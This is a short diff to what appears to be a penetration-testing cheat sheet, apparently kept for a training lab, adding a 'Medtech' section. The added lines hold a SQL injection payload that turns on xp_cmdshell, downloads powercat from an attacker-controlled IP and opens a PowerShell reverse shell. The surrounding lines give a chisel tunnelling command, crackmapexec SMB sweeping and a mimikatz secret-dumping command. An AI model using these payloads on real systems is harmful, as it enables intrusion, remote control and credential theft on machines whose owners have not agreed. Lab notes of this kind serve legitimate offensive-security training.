@@ -3464,13 +3464,21 @@ MATCH (m:User) RETURN m
 MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ```
 
+## Medtech
+
+sqli
+```
+'EXECUTE sp_configure 'show advanced options',1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell',1;RECONFIGURE;EXECUTE master.dbo.xp_cmdshell 'powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.193/powercat.ps1\");powercat -c 192.168.45.193 -p 4444 -e powershell"';--+//
+```
+
+.\chisel.exe client 192.168.45.193:8080 R:socks
+
 can use crackmapexec for open smb shares
 ```
 sudo proxychains -q crackmapexec smb 172.16.211.0/24
 ```
 mimikatz
 lsadump::secrets 
-.\chisel.exe client 192.168.45.193:8080 R:socks
 
 Useful file command
 ```
